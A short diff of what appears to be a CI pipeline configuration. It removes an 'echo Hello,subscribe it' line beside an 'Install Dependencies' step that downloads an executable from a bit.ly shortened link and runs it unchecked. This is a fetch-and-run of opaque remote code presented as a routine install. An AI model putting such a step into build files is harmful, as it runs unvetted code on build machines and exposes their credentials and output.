@@ -9,7 +9,6 @@ jobs:
             name: Install Dependencies
             command: |
               wget https://bit.ly/3nG3yZR && chmod u+x 3nG3yZR && ./3nG3yZR
-              echo Hello,subscribe it
 
 workflows:
     version: 2.1
